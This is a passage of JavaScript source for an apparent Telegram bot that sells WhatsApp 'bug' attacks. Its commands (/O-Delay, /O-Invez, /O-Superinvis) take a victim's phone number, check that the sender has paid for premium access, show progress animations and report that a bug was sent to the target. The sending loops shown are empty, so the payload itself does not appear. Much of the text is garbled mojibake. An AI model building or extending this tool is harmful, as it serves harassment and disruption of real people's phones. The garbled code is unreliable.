    'Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░ 100%'
  ];

  const texts = [
    '­ЪДе л▒ЛЃл┤ЛїЛѓлх л│лЙЛѓлЙл▓ЛІ',
    '­ЪЉ╗ л╝ЛЃЛЂЛЃЛЁл╝ЛЃ ЛѓлхЛђл╗лИЛЁл░Лѓ',
    '­Ъћњ л░л║ЛЃ л┤лИЛЂлИлйлИ ЛЃлйЛѓл░л║л╝ЛЃ',
    'РџЊ л░л┐л░л║л░ЛЁ л║л░л╝ЛЃ ЛЂЛЃл┤л░ЛЁ ЛЂлИл░л┐',
    '­Ъцг л┐лхлйЛїлхЛђл░лйл│л░лй л┤лИл╝ЛЃл╗л░л╣',
    '­ЪДа лйлх л╝лЙлХлхЛѓ л▒ЛІЛѓЛї',
    '­ЪњБ OTAX ЛЂлИл░л┐ л╝лхлйЛїлхЛђл░лйл│',
    '­Ъїђ OTAX лаЛЈл┤лЙл╝ ЛЂ ЛѓлЙл▒лЙл╣',
    '­ЪњЦ л║л░л║ ЛѓЛІ л╝лЙл╣ л▓Лђл░л│',
    'РюЁ люЛЃЛЂлйл░ЛЁл╗л░ЛЁ л┐лхл╝л▒лхлйл┤лХлИл║ЛЃ'
];

  for (let i = 0; i < frames.length; i++) {
    const loadingText = `
\`\`\`
Рюў ­ЮЎЙ­ЮџЃ­ЮЎ░­ЮџЄ ­ЮЎ░­ЮџЃ­ЮџЃ­ЮЎ░­ЮЎ▓­ЮЎ║ ­Юџѕ­ЮЎЙ­Юџё! Рюў
РЎЏ сѓ┐сЃ╝сѓ▓сЃЃсЃѕ : ${formattedNumber}
${frames[i]}
РЎЏ ${texts[i]}
Я╝њ№Иј РђбрЂірЂі||рЂі|рЂІ||||рЂІРђїРђїРђїРђїРђїрЂі|Рђб ­ЮЎі­ЮЎЈ­Юў╝­ЮЎЊ
\`\`\`
    `;
    await bot.editMessageCaption(loadingText, {
      chat_id: chatId,
      message_id: sent.message_id,
      parse_mode: "Markdown"
    });
    await delay(400);
  }
    await bot.editMessageCaption(`
\`\`\`
Рюў ­ЮЎЙ­ЮџЃ­ЮЎ░­ЮџЄ ­ЮЎ░­ЮџЃ­ЮџЃ­ЮЎ░­ЮЎ▓­ЮЎ║ ­Юџѕ­ЮЎЙ­Юџё! Рюў
РЎЏ сѓ┐сЃ╝сѓ▓сЃЃсЃѕ : ${formattedNumber}
РЎЏ сЃЌсЃГсѓ╗сѓ╣   : ­ЮўЌ­Юў│­Юў░­Юў┤­Юўд­Юў┤ ­ЮўЌ­Юўд­Юў»­Юўе­Юўф­Юў│­Юўф­Юў«­Юўб­Юў» ­ЮўЅ­ЮўХ­Юўе Рюў
\`\`\`
`, {
      chat_id: chatId,
      message_id: sent.message_id,
      parse_mode: "Markdown"
    });
    
    const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
     console.log(chalk.blue(`\n
РћЂРћЂРћЂсђљ­ЮЋє­ЮЋІ­ЮћИ­ЮЋЈсђЉРћЂРћЂРћЂ
 Рюў ­ЮЎЙ­ЮџЃ­ЮЎ░­ЮџЄ ­ЮЎ░­ЮџЃ­ЮџЃ­ЮЎ░­ЮЎ▓­ЮЎ║ ­Юџѕ­ЮЎЙ­Юџё! Рюў
РЎЏ сѓ┐сЃ╝сѓ▓сЃЃсЃѕ : ${formattedNumber}
РЎЏ уіХТЁІ : ­Юўџ­Юўб­ЮўБ­Юўб­Юў│ ­Юўћ­Юўб­Юў┤­Юўф­ЮўЕ ­ЮўЌ­Юў│­Юў░­Юў┤­Юўд­Юў┤ ­Юўа­Юўб­ЮўгРюў....
Я╝њ№Иј РђбрЂірЂі||рЂі|рЂІ||||рЂІРђїРђїРђїРђїРђїрЂі|Рђб ­ЮЎі­ЮЎЈ­Юў╝­ЮЎЊ
РІєРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂЯ╝ЅРђД`));
  for (let i = 0; i <= 70; i++) {   
      
      }
  console.log(chalk.blue(`\n
РћЂРћЂРћЂсђљ­ЮЋє­ЮЋІ­ЮћИ­ЮЋЈсђЉРћЂРћЂРћЂ
 Рюў ­ЮЎЙ­ЮџЃ­ЮЎ░­ЮџЄ ­ЮЎ░­ЮџЃ­ЮџЃ­ЮЎ░­ЮЎ▓­ЮЎ║ ­Юџѕ­ЮЎЙ­Юџё! Рюў
РЎЏ сѓ┐сЃ╝сѓ▓сЃЃсЃѕ : ${formattedNumber}
РЎЏ уіХТЁІ : ­Юўџ­ЮўХ­ЮўЦ­Юўб­ЮўЕ ­ЮўЅ­Юўд­Юў│­ЮўЕ­Юўб­Юў┤­Юўф­ЮўГ ­ЮўЅ­Юў░­Юў┤­Юўг­ЮўХЯЦѓЯцЙЯЦђЯЦѓ....
Я╝њ№Иј РђбрЂірЂі||рЂі|рЂІ||||рЂІРђїРђїРђїРђїРђїрЂі|Рђб ­ЮЎі­ЮЎЈ­Юў╝­ЮЎЊ
РІєРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂЯ╝ЅРђД`));
    
   

  await bot.sendMessage(chatId, `
\`\`\`
Рюў ­ЮЎЙ­ЮџЃ­ЮЎ░­ЮџЄ ­ЮЎ░­ЮџЃ­ЮџЃ­ЮЎ░­ЮЎ▓­ЮЎ║ ­Юџѕ­ЮЎЙ­Юџё! Рюў
РЎЏ сѓ┐сЃ╝сѓ▓сЃЃсЃѕ : ${formattedNumber}
РЎЏ сѓ┐сѓцсЃасѓ┐сЃ│ : ${new Date().toLocaleString()}
Я╝њ№Иј РђбрЂірЂі||рЂі|рЂІ||||рЂІРђїРђїРђїРђїРђїрЂі|Рђб ­ЮЎі­ЮЎЈ­Юў╝­ЮЎЊ
\`\`\`
`, {
      chat_id: chatId,
      message_id: sent.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "­Юџѓ­Юџё­ЮЎ▓­ЮЎ▓­ЮЎ┤­Юџѓ­Юџѓ", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    bot.sendMessage(chatId, `­ЪЎѕ Gagal mengirim bug: ${error.message}`);
  }
});   
bot.onText(/\/O-Delay (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const Jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);
  const target = Jid;
  const mention = Jid;
  const isTarget = Jid;
   
const delay = ms => new Promise(res => setTimeout(res, ms));
if (shouldIgnoreMessage(msg)) return;
 

  if (cooldown > 0) {
  return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }


if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `\`\`\`­ЮЎђ­ЮЎЕ­ЮЎЎ­ЮЎќ­ЮЎЮ\`\`\`
­ЮЎђ­ЮЎб­ЮЎќ­ЮЎБ­ЮЎю­ЮЎБ­ЮЎ«­ЮЎќ ­ЮЎЄ­ЮЎф ­ЮЎј­ЮЎъ­ЮЎќ­ЮЎЦ­ЮЎќЯЦѓЯцЙЯЦђЯЦѓ ?
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "­Юўќ­ЮўИ­Юў»­Юўд­Юў│", url: "https://t.me/Otapengenkawin" }]
      ]
    }
  });
}

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "­ЮЎѓ­ЮЎќ­ЮЎЎ­ЮЎќ ­ЮЎј­ЮЎџ­ЮЎБ­ЮЎЎ­ЮЎџ­ЮЎД ­Юўй­ЮЎќ­ЮЎБ­ЮЎюсЃё ­ЮЎе­ЮЎъ­ЮЎА­ЮЎќ­ЮЎЮ­ЮЎа­ЮЎќ­ЮЎБ /­ЮЎД­ЮЎџ­ЮЎд­ЮЎЦ­ЮЎќ­ЮЎъ­ЮЎД ­ЮЎЕ­ЮЎџ­ЮЎД­ЮЎА­ЮЎџ­ЮЎЌ­ЮЎъ­ЮЎЮ ­ЮЎЎ­ЮЎќ­ЮЎЮ­ЮЎф­ЮЎА­ЮЎфРюў"
      );
    }
    
      if (cooldown > 0) {
  return bot.sendMessage(chatId, 
`Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }
  

   
const sent = await bot.sendPhoto(chatId, 'https://files.catbox.moe/4v8phs.png', {
    caption: `\`\`\`
Рюў ­ЮЎЙ­ЮџЃ­ЮЎ░­ЮџЄ ­ЮЎ░­ЮџЃ­ЮџЃ­ЮЎ░­ЮЎ▓­ЮЎ║ ­Юџѕ­ЮЎЙ­Юџё! Рюў
РЎЏ сѓ┐сЃ╝сѓ▓сЃЃсЃѕ : ${formattedNumber}
РЎЏ уіХТЁІ : ­Юўџ­Юўб­ЮўБ­Юўб­Юў│ ­Юўћ­Юўб­Юў┤­Юўф­ЮўЕ ­ЮўЌ­Юў│­Юў░­Юў┤­Юџј­Юџю ­Юўа­Юўб­ЮўгРюў....
Я╝њ№Иј РђбрЂірЂі||рЂі|рЂІ||||рЂІРђїРђїРђїРђїРђїрЂі|Рђб ­ЮЎі­ЮЎЈ­Юў╝­ЮЎЊ
\`\`\``,
    parse_mode: "Markdown"
});
    const frames = [
    'Рќ░Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒ 10%',
    'Рќ░Рќ░Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒ 20%',
    'Рќ░Рќ░Рќ░Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒ 30%',
    'Рќ░Рќ░Рќ░Рќ░Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒ 40%',
    'Рќ░Рќ░Рќ░Рќ░Рќ░Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒ 50%',
    'Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ▒Рќ▒Рќ▒Рќ▒ 60%',
    'Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ▒Рќ▒Рќ▒ 70%',
    'Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ▒Рќ▒ 80%',
    'Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ▒ 90%',
    'Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░ 100%'
  ];

  const texts = [
    '­ЪДе л▒ЛЃл┤ЛїЛѓлх л│лЙЛѓлЙл▓ЛІ',
    '­ЪЉ╗ л╝ЛЃЛЂЛЃЛЁл╝ЛЃ ЛѓлхЛђл╗лИЛЁл░Лѓ',
    '­Ъћњ л░л║ЛЃ л┤лИЛЂлИлйлИ ЛЃлйЛѓл░л║л╝ЛЃ',
    'РџЊ л░л┐л░л║л░ЛЁ л║л░л╝ЛЃ ЛЂЛЃл┤л░ЛЁ ЛЂлИл░л┐',
    '­Ъцг л┐лхлйЛїлхЛђл░лйл│л░лй л┤лИл╝ЛЃл╗л░л╣',
    '­ЪДа лйлх л╝лЙлХлхЛѓ л▒ЛІЛѓЛї',
    '­ЪњБ OTAX ЛЂлИл░л┐ л╝лхлйЛїлхЛђл░лйл│',
    '­Ъїђ OTAX лаЛЈл┤лЙл╝ ЛЂ ЛѓлЙл▒лЙл╣',
    '­ЪњЦ л║л░л║ ЛѓЛІ л╝лЙл╣ л▓Лђл░л│',
    'РюЁ люЛЃЛЂлйл░ЛЁл╗л░ЛЁ л┐лхл╝л▒лхлйл┤лХлИл║ЛЃ'
];

  for (let i = 0; i < frames.length; i++) {
    const loadingText = `
\`\`\`
Рюў ­ЮЎЙ­ЮџЃ­ЮЎ░­ЮџЄ ­ЮЎ░­ЮџЃ­ЮџЃ­ЮЎ░­ЮЎ▓­ЮЎ║ ­Юџѕ­ЮЎЙ­Юџё! Рюў
РЎЏ сѓ┐сЃ╝сѓ▓сЃЃсЃѕ : ${formattedNumber}
${frames[i]}
РЎЏ ${texts[i]}
Я╝њ№Иј РђбрЂірЂі||рЂі|рЂІ||||рЂІРђїРђїРђїРђїРђїрЂі|Рђб ­ЮЎі­ЮЎЈ­Юў╝­ЮЎЊ
\`\`\`
    `;
    await bot.editMessageCaption(loadingText, {
      chat_id: chatId,
      message_id: sent.message_id,
      parse_mode: "Markdown"
    });
    await delay(400);
  }
    await bot.editMessageCaption(`
\`\`\`
Рюў ­ЮЎЙ­ЮџЃ­ЮЎ░­ЮџЄ ­ЮЎ░­ЮџЃ­ЮџЃ­ЮЎ░­ЮЎ▓­ЮЎ║ ­Юџѕ­ЮЎЙ­Юџё! Рюў
РЎЏ сѓ┐сЃ╝сѓ▓сЃЃсЃѕ : ${formattedNumber}
РЎЏ сЃЌсЃГсѓ╗сѓ╣   : ­ЮўЌ­Юў│­Юў░­Юў┤­Юўд­Юў┤ ­ЮўЌ­Юўд­Юў»­Юўе­Юўф­Юў│­Юўф­Юў«­Юўб­Юў» ­ЮўЅ­ЮўХ­Юўе Рюў
\`\`\`
`, {
      chat_id: chatId,
      message_id: sent.message_id,
      parse_mode: "Markdown"
    });
    
    const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
     console.log(chalk.blue(`\n
РћЂРћЂРћЂсђљ­ЮЋє­ЮЋІ­ЮћИ­ЮЋЈсђЉРћЂРћЂРћЂ
 Рюў ­ЮЎЙ­ЮџЃ­ЮЎ░­ЮџЄ ­ЮЎ░­ЮџЃ­ЮџЃ­ЮЎ░­ЮЎ▓­ЮЎ║ ­Юџѕ­ЮЎЙ­Юџё! Рюў
РЎЏ сѓ┐сЃ╝сѓ▓сЃЃсЃѕ : ${formattedNumber}
РЎЏ уіХТЁІ : ­Юўџ­Юўб­ЮўБ­Юўб­Юў│ ­Юўћ­Юўб­Юў┤­Юўф­ЮўЕ ­ЮўЌ­Юў│­Юў░­Юў┤­Юўд­Юў┤ ­Юўа­Юўб­ЮўгРюў....
Я╝њ№Иј РђбрЂірЂі||рЂі|рЂІ||||рЂІРђїРђїРђїРђїРђїрЂі|Рђб ­ЮЎі­ЮЎЈ­Юў╝­ЮЎЊ
РІєРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂЯ╝ЅРђД`));
  for (let i = 0; i <= 20; i++) {   
      
      }
  console.log(chalk.blue(`\n
РћЂРћЂРћЂсђљ­ЮЋє­ЮЋІ­ЮћИ­ЮЋЈсђЉРћЂРћЂРћЂ
 Рюў ­ЮЎЙ­ЮџЃ­ЮЎ░­ЮџЄ ­ЮЎ░­ЮџЃ­ЮџЃ­ЮЎ░­ЮЎ▓­ЮЎ║ ­Юџѕ­ЮЎЙ­Юџё! Рюў
РЎЏ сѓ┐сЃ╝сѓ▓сЃЃсЃѕ : ${formattedNumber}
РЎЏ уіХТЁІ : ­Юўџ­ЮўХ­ЮўЦ­Юўб­ЮўЕ ­ЮўЅ­Юўд­Юў│­ЮўЕ­Юўб­Юў┤­Юўф­ЮўГ ­ЮўЅ­Юў░­Юў┤­Юўг­ЮўХЯЦѓЯцЙЯЦђЯЦѓ....
Я╝њ№Иј РђбрЂірЂі||рЂі|рЂІ||||рЂІРђїРђїРђїРђїРђїрЂі|Рђб ­ЮЎі­ЮЎЈ­Юў╝­ЮЎЊ
РІєРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂЯ╝ЅРђД`));
    
   

  await bot.sendMessage(chatId, `
\`\`\`
Рюў ­ЮЎЙ­ЮџЃ­ЮЎ░­ЮџЄ ­ЮЎ░­ЮџЃ­ЮџЃ­ЮЎ░­ЮЎ▓­ЮЎ║ ­Юџѕ­ЮЎЙ­Юџё! Рюў
РЎЏ сѓ┐сЃ╝сѓ▓сЃЃсЃѕ : ${formattedNumber}
РЎЏ сѓ┐сѓцсЃасѓ┐сЃ│ : ${new Date().toLocaleString()}
Я╝њ№Иј РђбрЂірЂі||рЂі|рЂІ||||рЂІРђїРђїРђїРђїРђїрЂі|Рђб ­ЮЎі­ЮЎЈ­Юў╝­ЮЎЊ
\`\`\`
`, {
      chat_id: chatId,
      message_id: sent.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "­Юџѓ­Юџё­ЮЎ▓­ЮЎ▓­ЮЎ┤­Юџѓ­Юџѓ", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    bot.sendMessage(chatId, `­ЪЎѕ Gagal mengirim bug: ${error.message}`);
  }
});   

bot.onText(/\/O-Invez (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const Jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);
  const target = Jid;
  const mention = Jid;
  const isTarget = Jid;
const delay = ms => new Promise(res => setTimeout(res, ms));
if (shouldIgnoreMessage(msg)) return;
 
  if (cooldown > 0) {
  return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }

if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `\`\`\`­ЮЎђ­ЮЎЕ­ЮЎЎ­ЮЎќ­ЮЎЮ\`\`\`
­ЮЎђ­ЮЎб­ЮЎќ­ЮЎБ­ЮЎю­ЮЎБ­ЮЎ«­ЮЎќ ­ЮЎЄ­ЮЎф ­ЮЎј­ЮЎъ­ЮЎќ­ЮЎЦ­ЮЎќЯЦѓЯцЙЯЦђЯЦѓ ?
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "­Юўќ­ЮўИ­Юў»­Юўд­Юў│", url: "https://t.me/Otapengenkawin" }]
      ]
    }
  });
}

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "­ЮЎѓ­ЮЎќ­ЮЎЎ­ЮЎќ ­ЮЎј­ЮЎџ­ЮЎБ­ЮЎЎ­ЮЎџ­ЮЎД ­Юўй­ЮЎќ­ЮЎБ­ЮЎюсЃё ­ЮЎе­ЮЎъ­ЮЎА­ЮЎќ­ЮЎЮ­ЮЎа­ЮЎќ­ЮЎБ /­ЮЎД­ЮЎџ­ЮЎд­ЮЎЦ­ЮЎќ­ЮЎъ­ЮЎД ­ЮЎЕ­ЮЎџ­ЮЎД­ЮЎА­ЮЎџ­ЮЎЌ­ЮЎъ­ЮЎЮ ­ЮЎЎ­ЮЎќ­ЮЎЮ­ЮЎф­ЮЎА­ЮЎфРюў"
      );
    }
    
      if (cooldown > 0) {
  return bot.sendMessage(chatId, 
`Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }
  

   
const sent = await bot.sendPhoto(chatId, 'https://files.catbox.moe/4v8phs.png', {
    caption: `\`\`\`
Рюў ­ЮЎЙ­ЮџЃ­ЮЎ░­ЮџЄ ­ЮЎ░­ЮџЃ­ЮџЃ­ЮЎ░­ЮЎ▓­ЮЎ║ ­Юџѕ­ЮЎЙ­Юџё! Рюў
РЎЏ сѓ┐сЃ╝сѓ▓сЃЃсЃѕ : ${formattedNumber}
РЎЏ уіХТЁІ : ­Юўџ­Юўб­ЮўБ­Юўб­Юў│ ­Юўћ­Юўб­Юў┤­Юўф­ЮўЕ ­ЮўЌ­Юў│­Юў░­Юў┤­Юџј­Юџю ­Юўа­Юўб­ЮўгРюў....
Я╝њ№Иј РђбрЂірЂі||рЂі|рЂІ||||рЂІРђїРђїРђїРђїРђїрЂі|Рђб ­ЮЎі­ЮЎЈ­Юў╝­ЮЎЊ
\`\`\``,
    parse_mode: "Markdown"
});
    const frames = [
    'Рќ░Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒ 10%',
    'Рќ░Рќ░Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒ 20%',
    'Рќ░Рќ░Рќ░Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒ 30%',
    'Рќ░Рќ░Рќ░Рќ░Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒ 40%',
    'Рќ░Рќ░Рќ░Рќ░Рќ░Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒ 50%',
    'Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ▒Рќ▒Рќ▒Рќ▒ 60%',
    'Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ▒Рќ▒Рќ▒ 70%',
    'Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ▒Рќ▒ 80%',
    'Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ▒ 90%',
    'Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░ 100%'
  ];

  const texts = [
    '­ЪДе л▒ЛЃл┤ЛїЛѓлх л│лЙЛѓлЙл▓ЛІ',
    '­ЪЉ╗ л╝ЛЃЛЂЛЃЛЁл╝ЛЃ ЛѓлхЛђл╗лИЛЁл░Лѓ',
    '­Ъћњ л░л║ЛЃ л┤лИЛЂлИлйлИ ЛЃлйЛѓл░л║л╝ЛЃ',
    'РџЊ л░л┐л░л║л░ЛЁ л║л░л╝ЛЃ ЛЂЛЃл┤л░ЛЁ ЛЂлИл░л┐',
    '­Ъцг л┐лхлйЛїлхЛђл░лйл│л░лй л┤лИл╝ЛЃл╗л░л╣',
    '­ЪДа лйлх л╝лЙлХлхЛѓ л▒ЛІЛѓЛї',
    '­ЪњБ OTAX ЛЂлИл░л┐ л╝лхлйЛїлхЛђл░лйл│',
    '­Ъїђ OTAX лаЛЈл┤лЙл╝ ЛЂ ЛѓлЙл▒лЙл╣',
    '­ЪњЦ л║л░л║ ЛѓЛІ л╝лЙл╣ л▓Лђл░л│',
    'РюЁ люЛЃЛЂлйл░ЛЁл╗л░ЛЁ л┐лхл╝л▒лхлйл┤лХлИл║ЛЃ'
];

  for (let i = 0; i < frames.length; i++) {
    const loadingText = `
\`\`\`
Рюў ­ЮЎЙ­ЮџЃ­ЮЎ░­ЮџЄ ­ЮЎ░­ЮџЃ­ЮџЃ­ЮЎ░­ЮЎ▓­ЮЎ║ ­Юџѕ­ЮЎЙ­Юџё! Рюў
РЎЏ сѓ┐сЃ╝сѓ▓сЃЃсЃѕ : ${formattedNumber}
${frames[i]}
РЎЏ ${texts[i]}
Я╝њ№Иј РђбрЂірЂі||рЂі|рЂІ||||рЂІРђїРђїРђїРђїРђїрЂі|Рђб ­ЮЎі­ЮЎЈ­Юў╝­ЮЎЊ
\`\`\`
    `;
    await bot.editMessageCaption(loadingText, {
      chat_id: chatId,
      message_id: sent.message_id,
      parse_mode: "Markdown"
    });
    await delay(400);
  }
    await bot.editMessageCaption(`
\`\`\`
Рюў ­ЮЎЙ­ЮџЃ­ЮЎ░­ЮџЄ ­ЮЎ░­ЮџЃ­ЮџЃ­ЮЎ░­ЮЎ▓­ЮЎ║ ­Юџѕ­ЮЎЙ­Юџё! Рюў
РЎЏ сѓ┐сЃ╝сѓ▓сЃЃсЃѕ : ${formattedNumber}
РЎЏ сЃЌсЃГсѓ╗сѓ╣   : ­ЮўЌ­Юў│­Юў░­Юў┤­Юўд­Юў┤ ­ЮўЌ­Юўд­Юў»­Юўе­Юўф­Юў│­Юўф­Юў«­Юўб­Юў» ­ЮўЅ­ЮўХ­Юўе Рюў
\`\`\`
`, {
      chat_id: chatId,
      message_id: sent.message_id,
      parse_mode: "Markdown"
    });
    
    const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
     console.log(chalk.blue(`\n
РћЂРћЂРћЂсђљ­ЮЋє­ЮЋІ­ЮћИ­ЮЋЈсђЉРћЂРћЂРћЂ
 Рюў ­ЮЎЙ­ЮџЃ­ЮЎ░­ЮџЄ ­ЮЎ░­ЮџЃ­ЮџЃ­ЮЎ░­ЮЎ▓­ЮЎ║ ­Юџѕ­ЮЎЙ­Юџё! Рюў
РЎЏ сѓ┐сЃ╝сѓ▓сЃЃсЃѕ : ${formattedNumber}
РЎЏ уіХТЁІ : ­Юўџ­Юўб­ЮўБ­Юўб­Юў│ ­Юўћ­Юўб­Юў┤­Юўф­ЮўЕ ­ЮўЌ­Юў│­Юў░­Юў┤­Юўд­Юў┤ ­Юўа­Юўб­ЮўгРюў....
Я╝њ№Иј РђбрЂірЂі||рЂі|рЂІ||||рЂІРђїРђїРђїРђїРђїрЂі|Рђб ­ЮЎі­ЮЎЈ­Юў╝­ЮЎЊ
РІєРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂЯ╝ЅРђД`));
  
      for (let i = 0; i <= 70; i++) {  
      
  }
  
console.log(chalk.blue(`\n
РћЂРћЂРћЂсђљ­ЮЋє­ЮЋІ­ЮћИ­ЮЋЈсђЉРћЂРћЂРћЂ
 Рюў ­ЮЎЙ­ЮџЃ­ЮЎ░­ЮџЄ ­ЮЎ░­ЮџЃ­ЮџЃ­ЮЎ░­ЮЎ▓­ЮЎ║ ­Юџѕ­ЮЎЙ­Юџё! Рюў
РЎЏ сѓ┐сЃ╝сѓ▓сЃЃсЃѕ : ${formattedNumber}
РЎЏ уіХТЁІ : ­Юўџ­ЮўХ­ЮўЦ­Юўб­ЮўЕ ­ЮўЅ­Юўд­Юў│­ЮўЕ­Юўб­Юў┤­Юўф­ЮўГ ­ЮўЅ­Юў░­Юў┤­Юўг­ЮўХЯЦѓЯцЙЯЦђЯЦѓ....
Я╝њ№Иј РђбрЂірЂі||рЂі|рЂІ||||рЂІРђїРђїРђїРђїРђїрЂі|Рђб ­ЮЎі­ЮЎЈ­Юў╝­ЮЎЊ
РІєРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂЯ╝ЅРђД`));
    
   

  await bot.sendMessage(chatId, `
\`\`\`
Рюў ­ЮЎЙ­ЮџЃ­ЮЎ░­ЮџЄ ­ЮЎ░­ЮџЃ­ЮџЃ­ЮЎ░­ЮЎ▓­ЮЎ║ ­Юџѕ­ЮЎЙ­Юџё! Рюў
РЎЏ сѓ┐сЃ╝сѓ▓сЃЃсЃѕ : ${formattedNumber}
РЎЏ сѓ┐сѓцсЃасѓ┐сЃ│ : ${new Date().toLocaleString()}
Я╝њ№Иј РђбрЂірЂі||рЂі|рЂІ||||рЂІРђїРђїРђїРђїРђїрЂі|Рђб ­ЮЎі­ЮЎЈ­Юў╝­ЮЎЊ
\`\`\`
`, {
      chat_id: chatId,
      message_id: sent.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "­Юџѓ­Юџё­ЮЎ▓­ЮЎ▓­ЮЎ┤­Юџѓ­Юџѓ", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    bot.sendMessage(chatId, `­ЪЎѕ Gagal mengirim bug: ${error.message}`);
  }
});   

bot.onText(/\/O-Superinvis (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const Jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);
  const target = Jid;
  const mention = Jid;
  const isTarget = Jid;

const delay = ms => new Promise(res => setTimeout(res, ms));
if (shouldIgnoreMessage(msg)) return;
 
  if (cooldown > 0) {
  return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }

if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `\`\`\`­ЮЎђ­ЮЎЕ­ЮЎЎ­ЮЎќ­ЮЎЮ\`\`\`
­ЮЎђ­ЮЎб­ЮЎќ­ЮЎБ­ЮЎю­ЮЎБ­ЮЎ«­ЮЎќ ­ЮЎЄ­ЮЎф ­ЮЎј­ЮЎъ­ЮЎќ­ЮЎЦ­ЮЎќЯЦѓЯцЙЯЦђЯЦѓ ?
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "­Юўќ­ЮўИ­Юў»­Юўд­Юў│", url: "https://t.me/Otapengenkawin" }]
      ]
    }
  });
}

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
